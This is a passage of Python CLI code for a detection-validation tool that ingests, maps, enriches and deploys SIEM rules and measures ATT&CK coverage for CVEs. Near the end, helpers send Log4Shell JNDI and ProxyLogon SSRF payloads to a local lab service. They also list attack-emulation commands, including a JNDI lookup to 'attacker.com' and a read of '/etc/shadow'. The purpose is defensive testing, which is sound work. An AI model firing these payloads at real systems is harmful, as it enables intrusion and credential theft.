        f'    <text x="{lw // 2}" y="15" fill="#010101" fill-opacity=".3">{label}</text>\n'
        f'    <text x="{lw // 2}" y="14">{label}</text>\n'
        f'    <text x="{lw + vw // 2}" y="15" fill="#010101" fill-opacity=".3">{value}</text>\n'
        f'    <text x="{lw + vw // 2}" y="14">{value}</text>\n'
        f'  </g>\n'
        f'</svg>'
    )

    if output == "-":
        console.print(svg)
    else:
        Path(output).write_text(svg, encoding="utf-8")
        err_console.print(
            f"[green]✓[/] Badge written to [bold]{output}[/]  "
            f"coverage={n_covered}/{total} ({pct:.0f}%)"
        )


@main.command()
@click.argument("rules", required=False, default=".")
@click.option("--events", "-e", "events_file", default=None,
              type=click.Path(exists=True),
              help="JSONL events file for offline matching (omit to use live SIEM).")
@click.option("--siem", default="opensearch", show_default=True,
              help="SIEM backend to use when --events is not provided.")
@click.option("--since", default=1.0, show_default=True,
              help="Look-back window in hours.")
@click.option("--interval", default=5, show_default=True,
              help="Polling interval in seconds.")
def watch(rules: str, events_file: str | None, siem: str, since: float, interval: int) -> None:
    """Watch a rules directory for changes and re-validate automatically.

    Polls RULES every INTERVAL seconds. When any rule file is added, modified,
    or deleted the full corpus is re-evaluated and results are printed.

    Pass --events for fast offline matching or omit it to query a live SIEM.

    \b
    Examples:
      dv watch examples/detections/sigma/ --events events.jsonl
      dv watch examples/detections/sigma/ --siem opensearch --since 1
    """
    import time as _time
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from pathlib import Path as _Path
    import datetime as _dt

    rules_path = _Path(rules)
    registry = ParserRegistry()
    mode = f"events={_Path(events_file).name}" if events_file else f"siem={siem}"
    console.print(f"[cyan]Watching[/] {rules}  [{mode}]  interval={interval}s  (Ctrl+C to stop)\n")

    def _snapshot() -> dict[str, float]:
        if rules_path.is_file():
            return {str(rules_path): rules_path.stat().st_mtime}
        return {str(f): f.stat().st_mtime for f in rules_path.rglob("*") if f.is_file()}

    def _load() -> list:
        files = [rules_path] if rules_path.is_file() else sorted(
            f for f in rules_path.rglob("*") if f.is_file()
        )
        dets = []
        for fp in files:
            try:
                p = registry.find_parser(fp)
                if p:
                    dets.append(p.parse_file(fp))
            except (ParseError, Exception):
                pass
        return dets

    def _run(dets: list) -> tuple:
        import time as _t
        if events_file:
            from detection_validator.validator.matcher import match_corpus
            t0 = _t.time()
            results = match_corpus(dets, _Path(events_file), since_hours=since)
        else:
            from detection_validator.validator.engine import validate_corpus
            t0 = _t.time()
            results = validate_corpus(dets, siem=siem, since_hours=since)
        return results, _t.time() - t0

    last: dict[str, float] = {}
    try:
        while True:
            cur = _snapshot()
            changed = {f for f in cur if cur[f] != last.get(f)}
            removed = set(last) - set(cur)
            if changed or removed:
                ts = _dt.datetime.now().strftime("%H:%M:%S")
                if changed:
                    console.print(f"[dim]{ts}[/] [yellow]changed:[/] "
                                  f"{', '.join(_Path(f).name for f in sorted(changed))}")
                if removed:
                    console.print(f"[dim]{ts}[/] [red]removed:[/] "
                                  f"{', '.join(_Path(f).name for f in sorted(removed))}")
                dets = _load()
                if dets:
                    results, elapsed = _run(dets)
                    _render_results(results, dets, elapsed, "-", "cli")
                else:
                    err_console.print("[red]No parseable rules found.[/]")
                last = cur
            _time.sleep(interval)
    except KeyboardInterrupt:
        console.print("\n[dim]Stopped.[/]")


@main.command()
@click.argument("rules", default=".")
@click.option("--siem", default="opensearch", show_default=True,
              type=click.Choice(["opensearch", "splunk"]),
              help="SIEM backend to deploy rules to.")
@click.option("--index", default="dv-telemetry-*", show_default=True,
              help="Index pattern for OpenSearch alerting monitors.")
@click.option("--dry-run", is_flag=True, default=False,
              help="Print what would be deployed without making any changes.")
def deploy(rules: str, siem: str, index: str, dry_run: bool) -> None:
    """Deploy detection rules to a SIEM backend.

    Reads rules under RULES, converts each to the target SIEM's native
    alert/saved-search format, and pushes them via the SIEM's REST API.

    \b
    OpenSearch: creates Alerting monitors under /_plugins/_alerting/monitors.
    Splunk:     creates saved searches under /servicesNS/admin/search/saved/searches.

    \b
    Examples:
      dv deploy examples/detections/sigma/ --siem opensearch --dry-run
      dv deploy examples/detections/sigma/ --siem opensearch
      dv deploy examples/detections/sigma/ --siem splunk
    """
    import base64 as _b64
    import json as _json
    import os as _os
    import ssl
    import urllib.request
    import urllib.error
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError
    from pathlib import Path as _Path

    registry = ParserRegistry()
    root = _Path(rules)
    files = [root] if root.is_file() else sorted(f for f in root.rglob("*") if f.is_file())
    detections = []
    for fp in files:
        try:
            p = registry.find_parser(fp)
            if p:
                detections.append(p.parse_file(fp))
        except (ParseError, Exception) as exc:
            err_console.print(f"[yellow]⚠[/] {fp.name}: {exc}")

    if not detections:
        err_console.print(f"[red]No parseable rules found in:[/] {rules}")
        raise SystemExit(1)

    if dry_run:
        console.print(f"[yellow]Dry run[/] — would deploy {len(detections)} rule(s) to {siem}\n")

    deployed = failed = 0

    if siem == "opensearch":
        os_pass = _os.environ.get("OPENSEARCH_INITIAL_ADMIN_PASSWORD", "")
        if not os_pass:
            err_console.print("[red]OPENSEARCH_INITIAL_ADMIN_PASSWORD not set[/]")
            raise SystemExit(1)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        creds = _b64.b64encode(f"admin:{os_pass}".encode()).decode()
        base_url = "https://localhost:9200/_plugins/_alerting/monitors"

        for det in detections:
            techs = [t.full_id for t in det.mitre_techniques]
            should = [{"term": {"technique.keyword": t}} for t in techs]
            if not should:
                should = [{"match_all": {}}]

            monitor = {
                "type": "monitor",
                "name": det.name[:255],
                "monitor_type": "query_level_monitor",
                "enabled": True,
                "schedule": {"period": {"interval": 1, "unit": "HOURS"}},
                "inputs": [{
                    "search": {
                        "indices": [index],
                        "query": {
                            "size": 0,
                            "query": {"bool": {"should": should, "minimum_should_match": 1}},
                        },
                    }
                }],
                "triggers": [{
                    "query_level_trigger": {
                        "id": str(det.id)[:64],
                        "name": "fires",
                        "severity": "1",
                        "condition": {
                            "script": {
                                "source": "ctx.results[0].hits.total.value > 0",
                                "lang": "painless",
                            }
                        },
                        "actions": [],
                    }
                }],
            }

            if dry_run:
                console.print(f"  [cyan]{det.name}[/]  techniques={techs or '(none)'}")
                deployed += 1
                continue

            payload = _json.dumps(monitor).encode()
            req = urllib.request.Request(
                base_url,
                data=payload,
                method="POST",
                headers={"Content-Type": "application/json",
                         "Authorization": f"Basic {creds}"},
            )
            try:
                with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                    _json.loads(resp.read())
                console.print(f"[green]✓[/] Deployed: {det.name}")
                deployed += 1
            except urllib.error.HTTPError as exc:
                body = exc.read().decode(errors="replace")[:120]
                err_console.print(f"[red]✗[/] {det.name}: HTTP {exc.code} — {body}")
                failed += 1
            except Exception as exc:
                err_console.print(f"[red]✗[/] {det.name}: {exc}")
                failed += 1

    elif siem == "splunk":
        splunk_url = "http://localhost:8089/servicesNS/admin/search/saved/searches"
        sev_map = {"critical": "1", "high": "2", "med": "3", "low": "4", "info": "5"}

        for det in detections:
            techs = [t.full_id for t in det.mitre_techniques]
            tech_filter = " OR ".join(f'technique="{t}"' for t in techs) if techs else ""
            spl = f"index=dv-telemetry {tech_filter} | table _time, technique, key, exe, uid"
            sev = sev_map.get(det.severity.value, "3")

            if dry_run:
                console.print(f"  [cyan]{det.name}[/]  search={spl[:60]}…")
                deployed += 1
                continue

            import urllib.parse
            body = urllib.parse.urlencode({
                "name": det.name[:255],
                "search": spl,
                "description": det.description or "",
                "alert.severity": sev,
                "is_scheduled": "1",
                "cron_schedule": "0 * * * *",
                "alert_type": "number of events",
                "alert_comparator": "greater than",
                "alert_threshold": "0",
            }).encode()
            req = urllib.request.Request(splunk_url, data=body, method="POST")
            try:
                with urllib.request.urlopen(req, timeout=10) as resp:
                    pass
                console.print(f"[green]✓[/] Deployed: {det.name}")
                deployed += 1
            except urllib.error.HTTPError as exc:
                err_console.print(f"[red]✗[/] {det.name}: HTTP {exc.code}")
                failed += 1
            except Exception as exc:
                err_console.print(f"[red]✗[/] {det.name}: {exc}")
                failed += 1

    suffix = " [yellow](dry run)[/]" if dry_run else ""
    console.print(
        f"\n[bold]Deploy:[/] {deployed} succeeded  [red]{failed} failed[/]{suffix}"
    )


@main.command()
@click.argument("path", default=".", type=click.Path(exists=True))
@click.option("--output", "-o", default="-", help="Output JSONL file path (- for stdout).")
@click.option("--format", "fmt", default=None,
              type=click.Choice(["sigma", "splunk", "kql", "yara", "elastic_eql",
                                 "splunk_security_content", "generic_yaml"]),
              help="Force a specific parser instead of auto-detecting.")
@click.option("--recursive/--no-recursive", default=True, show_default=True,
              help="Recursively scan subdirectories.")
@click.option("--strict", is_flag=True, default=False,
              help="Abort on the first parse error instead of skipping.")
def ingest(path: str, output: str, fmt: str | None, recursive: bool, strict: bool) -> None:
    """Scan PATH for detection rules and emit CanonicalDetection JSONL.

    PATH may be a single file or a directory.  Each successfully parsed rule
    is written as one JSON object per line to OUTPUT (default: stdout).

    Examples:

      dv ingest detections/ -o canonical.jsonl

      dv ingest rule.yml --format sigma

      dv ingest detections/ --strict --output all.jsonl
    """
    from detection_validator.parsers.registry import ParserRegistry
    from detection_validator.parsers.base import ParseError

    registry = ParserRegistry()
    root = Path(path)
    out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout

    total = 0
    errors = 0

    try:
        if root.is_file():
            files = [root]
        else:
            glob = root.rglob("*") if recursive else root.glob("*")
            files = [p for p in sorted(glob) if p.is_file()]

        for file_path in files:
            try:
                if fmt:
                    parser = next((p for p in registry.parsers if p.name == fmt), None)
                    if parser is None:
                        err_console.print(f"[red]Unknown parser: {fmt}[/]")
                        raise SystemExit(1)
                    detection = parser.parse_file(file_path)
                else:
                    parser = registry.find_parser(file_path)
                    if parser is None:
                        continue
                    detection = parser.parse_file(file_path)

                line = detection.model_dump_json()
                print(line, file=out)
                total += 1
                err_console.print(f"[green]✓[/] {file_path}  ({parser.name})")

            except ParseError as exc:
                errors += 1
                err_console.print(f"[red]✗[/] {file_path}: {exc}")
                if strict:
                    raise SystemExit(1)
            except Exception as exc:  # noqa: BLE001
                errors += 1
                err_console.print(f"[red]✗[/] {file_path}: {exc}")
                if strict:
                    raise SystemExit(1)

    finally:
        if output != "-":
            out.close()

    err_console.print(f"\n[bold]Ingested:[/] {total} rules  [red]errors:[/] {errors}")
    if strict and errors:
        raise SystemExit(1)


@main.group()
def intel() -> None:
    """Manage local intelligence caches (ATT&CK, CVE, etc.)."""


@intel.command("update")
@click.option("--source", default="attack",
              type=click.Choice(["attack", "cve", "all"]),
              show_default=True,
              help="Intelligence source to refresh.")
@click.option("--domain", default="enterprise-attack",
              type=click.Choice(["enterprise-attack", "mobile-attack", "ics-attack"]),
              show_default=True,
              help="ATT&CK domain(s) to download (attack source only).")
@click.option("--cve", "cve_ids", default=None,
              help="Comma-separated CVE IDs to refresh (cve source only; omit for full catalog).")
@click.option("--force", is_flag=True, default=False,
              help="Force download even if cache is still fresh.")
def intel_update(source: str, domain: str, cve_ids: str | None, force: bool) -> None:
    """Refresh local intelligence caches.

    Examples:

      dv intel update --source attack

      dv intel update --source attack --domain ics-attack --force

      dv intel update --source cve

      dv intel update --source cve --cve CVE-2021-44228,CVE-2022-30190
    """
    if source in ("attack", "all"):
        from detection_validator.mappers.attack_mapper import AttackKnowledgeBase

        domains = (
            ["enterprise-attack", "mobile-attack", "ics-attack"]
            if domain == "all"
            else [domain]
        )
        for d in domains:
            err_console.print(f"[cyan]Refreshing ATT&CK bundle:[/] {d}")
            kb = AttackKnowledgeBase(domain=d)
            try:
                kb.ensure_loaded(force_refresh=force)
                err_console.print(f"[green]✓[/] {d}: {len(kb._techniques)} techniques indexed")
            except Exception as exc:
                err_console.print(f"[red]✗[/] {d}: {exc}")

    if source in ("cve", "all"):
        from detection_validator.mappers.cve_mapper import CVEKnowledgeBase

        err_console.print("[cyan]Refreshing CVE intelligence caches[/]")
        kb = CVEKnowledgeBase()
        ids = [c.strip() for c in cve_ids.split(",")] if cve_ids else None
        try:
            kb.update(cve_ids=ids, force=force)
            if ids:
                err_console.print(f"[green]✓[/] CVE cache refreshed for: {', '.join(ids)}")
            else:
                kev_size = len(kb._kev_catalog or {})
                ctid_size = len(kb._ctid_catalog or {})
                err_console.print(
                    f"[green]✓[/] KEV: {kev_size} entries  CTID: {ctid_size} entries"
                )
        except Exception as exc:
            err_console.print(f"[red]✗[/] CVE update failed: {exc}")


@main.command()
@click.option("--input", "-i", "input_file", required=True,
              type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv ingest).")
@click.option("--output", "-o", default="-",
              help="Output JSONL file path (- for stdout).")
@click.option("--mode", default="hybrid",
              type=click.Choice(["explicit", "inferred", "hybrid"]),
              show_default=True,
              help="Mapping strategy.")
@click.option("--llm", is_flag=True, default=False,
              help="Enable LLM-based inference (requires ANTHROPIC_API_KEY).")
@click.option("--min-confidence", default=0.50, show_default=True,
              help="Minimum confidence threshold when applying inferred techniques.")
@click.option("--domain", default="enterprise-attack",
              type=click.Choice(["enterprise-attack", "mobile-attack", "ics-attack"]),
              show_default=True)
def map(
    input_file: str,
    output: str,
    mode: str,
    llm: bool,
    min_confidence: float,
    domain: str,
) -> None:
    """Map detection rules to MITRE ATT&CK techniques.

    Reads CanonicalDetection JSONL (from ``dv ingest``), validates and/or
    infers ATT&CK technique tags, and writes updated detections to OUTPUT.

    Examples:

      dv map --input canonical.jsonl --output mapped.jsonl --mode hybrid

      dv map -i canonical.jsonl -o mapped.jsonl --mode inferred --llm
    """
    from detection_validator.mappers.attack_mapper import (
        AttackKnowledgeBase,
        AttackMapper,
        MappingMode,
    )
    from detection_validator.normalizer.schema import CanonicalDetection

    kb = AttackKnowledgeBase(domain=domain)
    try:
        kb.ensure_loaded()
    except Exception as exc:
        err_console.print(f"[yellow]⚠ Could not load ATT&CK knowledge base: {exc}[/]")
        err_console.print("[yellow]Proceeding without KB validation (inferred mode only)[/]")

    mapper = AttackMapper(kb=kb, use_llm=llm)
    out = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout

    total = errors = warnings_count = applied = 0

    try:
        with open(input_file, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    detection = CanonicalDetection.model_validate_json(line)
                except Exception as exc:
                    err_console.print(f"[red]Parse error:[/] {exc}")
                    errors += 1
                    continue

                result = mapper.map_detection(detection, mode=mode)
                updated = mapper.apply(detection, result, min_confidence=min_confidence)

                if result.errors:
                    for e in result.errors:
                        err_console.print(f"[red]  ✗[/] {detection.name}: {e}")
                    errors += len(result.errors)

                if result.warnings:
                    for w in result.warnings:
                        err_console.print(f"[yellow]  ⚠[/] {detection.name}: {w}")
                    warnings_count += len(result.warnings)

                new_count = len(updated.mitre_techniques) - len(detection.mitre_techniques)
                if new_count > 0:
                    applied += new_count

                print(updated.model_dump_json(), file=out)
                total += 1

    finally:
        if output != "-":
            out.close()

    err_console.print(
        f"\n[bold]Mapped:[/] {total} detections  "
        f"[green]+{applied} techniques[/]  "
        f"[yellow]warnings: {warnings_count}[/]  "
        f"[red]errors: {errors}[/]"
    )


@main.command()
@click.option("--input", "-i", "input_file", default="-",
              help="JSONL file of CanonicalDetection objects (from dv ingest/map). - for stdin.")
@click.option("--output", "-o", default="-",
              help="Output JSONL file path (- for stdout).")
@click.option("--sources", default="attack,cve,severity", show_default=True,
              help="Comma-separated enrichment passes to run: attack, cve, severity.")
def enrich(input_file: str, output: str, sources: str) -> None:
    """Fill missing metadata on CanonicalDetection objects.

    Three enrichment passes (each independently skippable via --sources):

    \b
      attack   Fill technique names, URLs, and tactics from the local ATT&CK KB.
      cve      Create CVEReference entries from cve.YYYY.NNNNN tags and fill
               .cvss_score / .description from NVD/KEV/EPSS caches.
      severity Derive severity from the highest CVSS score across all linked CVEs
               (only applied when severity is still at the default MED).

    Input/output is CanonicalDetection JSONL — same schema as dv ingest / dv map.

    \b
    Workflow:
      dv ingest detections/ | dv map -i - | dv enrich > enriched.jsonl
      dv ingest detections/ -o canonical.jsonl
      dv map -i canonical.jsonl -o mapped.jsonl
      dv enrich -i mapped.jsonl -o enriched.jsonl

    \b
    Skip individual passes:
      dv enrich -i mapped.jsonl --sources attack         # technique names only
      dv enrich -i mapped.jsonl --sources cve,severity   # skip ATT&CK pass
    """
    from detection_validator.normalizer.schema import CanonicalDetection
    from detection_validator.enricher.engine import enrich_detection

    source_set = {s.strip().lower() for s in sources.split(",") if s.strip()}
    valid = {"attack", "cve", "severity"}
    unknown = source_set - valid
    if unknown:
        err_console.print(f"[red]Unknown sources: {', '.join(sorted(unknown))}[/]  valid: {', '.join(sorted(valid))}")
        raise SystemExit(1)

    # Load knowledge bases once up front
    attack_kb = None
    cve_kb = None

    if "attack" in source_set:
        try:
            from detection_validator.mappers.attack_mapper import AttackKnowledgeBase
            attack_kb = AttackKnowledgeBase()
            attack_kb.ensure_loaded()
            err_console.print(f"[cyan]ATT&CK KB loaded:[/] {len(attack_kb._techniques)} techniques")
        except Exception as exc:
            err_console.print(f"[yellow]⚠ Could not load ATT&CK KB: {exc} — skipping attack pass[/]")

    if "cve" in source_set:
        try:
            from detection_validator.mappers.cve_mapper import CVEKnowledgeBase
            cve_kb = CVEKnowledgeBase()
            err_console.print("[cyan]CVE KB ready[/]")
        except Exception as exc:
            err_console.print(f"[yellow]⚠ Could not load CVE KB: {exc} — skipping cve pass[/]")

    in_fh = open(input_file, encoding="utf-8") if input_file != "-" else sys.stdin
    out_fh = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout

    total = errors = 0
    total_techniques = total_cve_added = total_cve_enriched = total_severity = total_warnings = 0

    try:
        for line in in_fh:
            line = line.strip()
            if not line:
                continue
            try:
                detection = CanonicalDetection.model_validate_json(line)
            except Exception as exc:
                err_console.print(f"[red]Parse error:[/] {exc}")
                errors += 1
                continue

            result = enrich_detection(
                detection,
                attack_kb=attack_kb,
                cve_kb=cve_kb,
                sources=source_set,
            )

            total_techniques += result.techniques_enriched
            total_cve_added += result.cve_refs_added
            total_cve_enriched += result.cve_refs_enriched
            total_severity += int(result.severity_updated)
            total_warnings += len(result.warnings)

            for w in result.warnings:
                err_console.print(f"[yellow]  ⚠[/] {detection.name}: {w}")

            if result.changed:
                err_console.print(f"[green]✓[/] {detection.name}")
            else:
                err_console.print(f"  [dim]–[/] {detection.name}  (no changes)")

            print(detection.model_dump_json(), file=out_fh)
            total += 1

    finally:
        if input_file != "-":
            in_fh.close()
        if output != "-":
            out_fh.close()

    err_console.print(
        f"\n[bold]Enriched:[/] {total} detections  "
        f"[green]+{total_techniques} technique names[/]  "
        f"[green]+{total_cve_added} CVE refs[/]  "
        f"[green]+{total_cve_enriched} CVE details[/]  "
        f"[green]{total_severity} severity updates[/]  "
        f"[yellow]warnings: {total_warnings}[/]  "
        f"[red]errors: {errors}[/]"
    )


@main.command("cve-coverage")
@click.option("--cve", "cve_ids", required=True,
              help="Comma-separated CVE IDs to analyze, e.g. CVE-2021-44228,CVE-2022-30190.")
@click.option("--detections", "-d", default=None,
              type=click.Path(exists=True),
              help="JSONL file of CanonicalDetection objects (from dv ingest/map). "
                   "Omit to check technique coverage without a corpus.")
@click.option("--llm", is_flag=True, default=False,
              help="Enable LLM-based technique inference (requires ANTHROPIC_API_KEY).")
@click.option("--output", "-o", default="-",
              help="Output file path (- for stdout).")
@click.option("--format", "fmt", default="cli",
              type=click.Choice(["cli", "json"]),
              show_default=True)
@click.option("--min-risk", default=0.0, show_default=True,
              help="Only include CVEs with residual_risk_score ≥ this value.")
def cve_coverage(
    cve_ids: str,
    detections: str | None,
    llm: bool,
    output: str,
    fmt: str,
    min_risk: float,
) -> None:
    """Analyze ATT&CK technique coverage for one or more CVEs.

    For each CVE, the command:

    \b
      1. Fetches metadata from NVD, CISA KEV, CTID, and EPSS.
      2. Maps the CVE to ATT&CK techniques (CTID → CWE → LLM).
      3. Checks the detection corpus for coverage of each technique.
      4. Computes residual_risk = CVSS × EPSS × (1 − coverage_ratio).

    Examples:

    \b
      dv cve-coverage --cve CVE-2021-44228
      dv cve-coverage --cve CVE-2021-44228,CVE-2022-30190 -d mapped.jsonl
      dv cve-coverage --cve CVE-2021-44228 -d mapped.jsonl --llm --format json
    """
    from detection_validator.mappers.cve_mapper import (
        CVECoverageAnalyzer,
        CVEKnowledgeBase,
        CVEToTechniqueMapper,
    )
    from detection_validator.normalizer.schema import CanonicalDetection

    ids = [c.strip().upper() for c in cve_ids.split(",") if c.strip()]

    corpus: list[CanonicalDetection] = []
    if detections:
        with open(detections, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    corpus.append(CanonicalDetection.model_validate_json(line))
                except Exception as exc:
                    err_console.print(f"[yellow]⚠ Skipping malformed detection: {exc}[/]")

    kb = CVEKnowledgeBase()
    mapper = CVEToTechniqueMapper(kb=kb, use_llm=llm)
    analyzer = CVECoverageAnalyzer(mapper=mapper)

    results = analyzer.analyze_corpus(ids, corpus)
    results = [r for r in results if r.residual_risk_score >= min_risk]

    out_file = open(output, "w", encoding="utf-8") if output != "-" else sys.stdout
    out_console = Console(file=out_file, highlight=False)
    try:
        if fmt == "json":
            payload = []
            for r in results:
                payload.append({
                    "cve_id": r.cve_id,
                    "cvss_score": r.cvss_score,
                    "epss_score": r.epss_score,
                    "in_kev": r.in_kev,
                    "coverage_ratio": r.coverage_ratio,
                    "residual_risk_score": r.residual_risk_score,
                    "covered_techniques": r.covered_technique_ids,
                    "uncovered_techniques": r.uncovered_technique_ids,
                    "techniques": [
                        {
                            "technique_id": t.technique_id,
                            "tactic": t.tactic,
                            "confidence": t.confidence,
                            "source": t.source,
                        }
                        for t in r.techniques
                    ],
                    "covering_detections": r.covering_detections,
                })
            print(json.dumps(payload, indent=2), file=out_file)
        else:
            for r in results:
                kev_flag = "[red]KEV[/] " if r.in_kev else ""
                out_console.print(
                    f"\n[bold cyan]{r.cve_id}[/]  {kev_flag}"
                    f"CVSS={r.cvss_score or '?'}  "
                    f"EPSS={r.epss_score or '?'}  "
                    f"coverage={r.coverage_ratio:.0%}  "
                    f"residual_risk=[bold]{r.residual_risk_score:.3f}[/]"
                )
                if r.techniques:
                    for t in r.techniques:
                        covered = t.technique_id in r.covered_technique_ids
                        icon = "[green]✓[/]" if covered else "[red]✗[/]"
                        det_names = r.covering_detections.get(t.technique_id, [])
                        det_str = f" ← {', '.join(det_names[:3])}" if det_names else ""
                        out_console.print(
                            f"  {icon} {t.technique_id}  {t.tactic}  "
                            f"conf={t.confidence:.2f}  [{t.source}]{det_str}"
                        )
                else:
                    out_console.print("  [yellow](no techniques mapped)[/]")
    finally:
        if output != "-":
            out_file.close()


@main.command()
@click.option("--detections", "-d", required=True,
              type=click.Path(exists=True),
              help="JSONL file of mapped CanonicalDetection objects (from dv map).")
@click.option("--output", "-o", default="navigator-layer.json", show_default=True,
              help="Output file path for the Navigator layer JSON.")
@click.option("--name", default="Detection Coverage", show_default=True,
              help="Layer name shown in the Navigator UI.")
@click.option("--description", default="Generated by detection-validator", show_default=True,
              help="Layer description shown in the Navigator UI.")
def navigator(detections: str, output: str, name: str, description: str) -> None:
    """Export an ATT&CK Navigator layer from a mapped detection corpus.

    The layer JSON can be loaded directly into the MITRE ATT&CK Navigator
    at https://mitre-attack.github.io/attack-navigator/ to visualise which
    techniques your detections cover.

    \b
    Workflow:
      detection-validator ingest detections/ -o canonical.jsonl
      detection-validator map -i canonical.jsonl -o mapped.jsonl
      detection-validator navigator -d mapped.jsonl -o layer.json
      # then open https://mitre-attack.github.io/attack-navigator/
      # and load layer.json via Open Existing Layer → Upload from local

    Examples:

    \b
      detection-validator navigator -d mapped.jsonl
      detection-validator navigator -d mapped.jsonl -o my-layer.json --name "SOC Coverage Q2"
    """
    import json as _json
    from detection_validator.normalizer.schema import CanonicalDetection
    from detection_validator.coverage.matrix import CoverageMatrix

    corpus: list[CanonicalDetection] = []
    with open(detections, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                corpus.append(CanonicalDetection.model_validate_json(line))
            except Exception as exc:
                err_console.print(f"[yellow]⚠ Skipping malformed detection: {exc}[/]")

    matrix = CoverageMatrix(corpus)
    layer = matrix.to_navigator_layer(name=name, description=description)

    with open(output, "w", encoding="utf-8") as fh:
        _json.dump(layer, fh, indent=2)

    technique_count = len(layer["techniques"])
    tactic_set = {t["tactic"] for t in layer["techniques"]}
    console.print(
        f"[green]✓[/] Navigator layer written to [bold]{output}[/]  "
        f"({technique_count} techniques across {len(tactic_set)} tactics)"
    )
    console.print(
        "  Open [cyan]https://mitre-attack.github.io/attack-navigator/[/] "
        "→ [bold]Open Existing Layer[/] → [bold]Upload from local[/]"
    )


def _run_exploit_direct(cve_id: str, vuln_port: str) -> None:
    """
    Send a real HTTP exploit payload to the vulnerable service.
    The service spawns actual OS processes, generating genuine auditd events.
    No /simulate endpoint is used — telemetry comes purely from kernel events.
    """
    import time as _time
    import urllib.request

    base_url = f"http://localhost:{vuln_port}"

    # Verify the vulnerable service is up
    try:
        urllib.request.urlopen(f"{base_url}/health", timeout=3)
    except Exception:
        err_console.print(f"[red]✗ Vulnerable service not reachable at {base_url}[/]")
        err_console.print("  Run:  vagrant provision  to deploy it.")
        raise SystemExit(1)

    _EXPLOITS: dict[str, list[dict]] = {
        "CVE-2021-44228": [
            {
                "description": "Log4Shell JNDI injection via X-Api-Version header",
                "technique": "T1190 + T1059.004",
                "method": "POST",
                "path": "/api/log",
                "headers": {
                    "Content-Type": "application/json",
                    # Real JNDI payload — the service makes a real curl to this URL
                    "X-Api-Version": "${jndi:ldap://10.0.2.2:1389/exploit}",
                },
                "body": b'{"msg": "user login"}',
            },
        ],
        "CVE-2021-26855": [
            {
                "description": "ProxyLogon Exchange SSRF via malicious X-BEResource cookie",
                "technique": "T1190 + T1552.001 + T1078",
                "method": "POST",
                "path": "/ecp/DDI/DDIService.svc/GetObject",
                "headers": {
                    "Content-Type": "application/json",
                    # Real ProxyLogon SSRF cookie pattern
                    "Cookie": "X-BEResource=a]@victim:444/EWS/Exchange.asmx?~3;",
                },
                "body": b"{}",
            },
        ],
    }

    exploits = _EXPLOITS.get(cve_id.upper(), [])
    if not exploits:
        err_console.print(f"[red]No exploit defined for {cve_id} in exploit mode.[/]")
        err_console.print(f"Available: {', '.join(_EXPLOITS)}")
        raise SystemExit(1)

    console.print(f"[bold cyan]  Mode: exploit[/] — sending real HTTP payloads to {base_url}\n")
    total = 0
    for exp in exploits:
        console.print(f"  [dim]{exp['description']}[/]")
        req = urllib.request.Request(
            f"{base_url}{exp['path']}",
            data=exp.get("body", b""),
            headers=exp.get("headers", {}),
            method=exp["method"],
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = json.loads(resp.read())
            console.print(f"  [green]✓[/] [bold]{exp['technique']}[/]  status={result.get('status','?')}")
            if result.get("rce"):
                console.print(f"    [dim]{result['rce'][:80]}[/]")
            if result.get("identity"):
                console.print(f"    [dim]{result['identity'][:80]}[/]")
            total += 1
        except Exception as exc:
            err_console.print(f"  [red]✗ exploit failed: {exc}[/]")
        _time.sleep(1)

    console.print(f"\n[bold green]✓ {total} exploit(s) delivered.[/]")
    console.print("[dim]Real auditd events generated — allow 3–5s for Vector to flush.[/]")


def _run_attack_direct(scenario_path: Path, agent_port: str, delay: float) -> None:
    """Run an attack scenario by calling the victim agent directly (vagrant mode)."""
    import time as _time
    import urllib.request

    try:
        import yaml
    except ImportError:
        err_console.print("[red]pyyaml not installed. Run: pip install pyyaml[/]")
        raise SystemExit(1)

    # Map techniques to concrete step payloads (mirrors docker/atomic-runner/techniques.py)
    _TECHNIQUE_STEPS: dict[str, list[dict]] = {
        "T1190": [
            {"technique": "T1190", "variant": "log4shell", "event_type": "SYSCALL",
             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
             "command": "curl -sk http://127.0.0.1:8080/ -H 'X-Api-Version: ${jndi:ldap://attacker.com/exploit}' 2>&1 | head -5",
             "extra": {"http_method": "GET", "cve": "CVE-2021-44228"}},
            {"technique": "T1190", "variant": "proxylogon", "event_type": "SYSCALL",
             "key": "network_connect", "exe": "/usr/bin/curl", "uid": "33",
             "command": "curl -sk http://127.0.0.1:443/ews/exchange.asmx -H 'Cookie: X-BEResource=a]@SERVER:444/EWS/Exchange.asmx?~3;' 2>&1 | head -5",
             "extra": {"http_method": "POST", "cve": "CVE-2021-26855"}},
        ],
        "T1059.004": [
            {"technique": "T1059.004", "event_type": "SYSCALL", "key": "shell_exec",
             "exe": "/bin/bash", "uid": "33",
             "command": "id && whoami && uname -a",
             "extra": {"interpreter": "bash"}},
        ],
        "T1068": [
            {"technique": "T1068", "event_type": "SYSCALL", "key": "priv_change",
             "exe": "/tmp/exploit", "uid": "1001",
             "command": "ls -la /etc/shadow 2>&1 | head -3",
             "extra": {"description": "privilege escalation attempt"}},
        ],
        "T1547.012": [
            {"technique": "T1547.012", "event_type": "PATH", "key": "file_write",
             "exe": "/bin/cp", "uid": "0",
             "command": "ls /usr/lib/cups/backend/ 2>/dev/null | head -5",
             "extra": {"path": "/usr/lib/cups/backend/malicious"}},
        ],
        "T1574.001": [
            {"technique": "T1574.001", "event_type": "PATH", "key": "file_write",
             "exe": "/bin/bash", "uid": "1001",
             "command": "echo 'hijack library drop' && ls /tmp/ | head -5",
             "extra": {"path": "/tmp/libmalicious.so"}},
        ],
        "T1505.003": [
            {"technique": "T1505.003", "event_type": "PATH", "key": "file_write",
             "exe": "/usr/bin/php", "uid": "33",
             "command": "ls /var/www/ 2>/dev/null | head -5",
